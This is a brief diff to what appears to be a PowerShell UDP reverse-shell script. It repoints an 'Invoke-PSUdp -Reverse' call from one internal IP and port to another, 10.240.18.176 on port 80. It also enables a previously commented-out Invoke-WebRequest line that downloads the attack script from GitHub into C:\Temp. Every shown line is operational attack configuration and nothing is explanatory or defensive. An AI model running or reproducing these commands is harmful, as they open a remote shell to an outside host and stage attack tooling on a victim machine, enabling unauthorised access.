@@ -106,5 +106,5 @@ function Invoke-PSUdp
     }
 }
 
-Invoke-PSUdp -Reverse -IPAddress 10.240.18.169 -Port 445
-#Invoke-WebRequest -Uri "https://github.com/pattersonbr/InvokeShellcode/blob/master/Invoke-PowerShellUdp.ps1" -OutFile "C:\Temp\Invoke-PSUdp.ps1"
+Invoke-PSUdp -Reverse -IPAddress 10.240.18.176 -Port 80
+Invoke-WebRequest -Uri "https://github.com/pattersonbr/InvokeShellcode/blob/master/Invoke-PowerShellUdp.ps1" -OutFile "C:\Temp\Invoke-PSUdp.ps1"
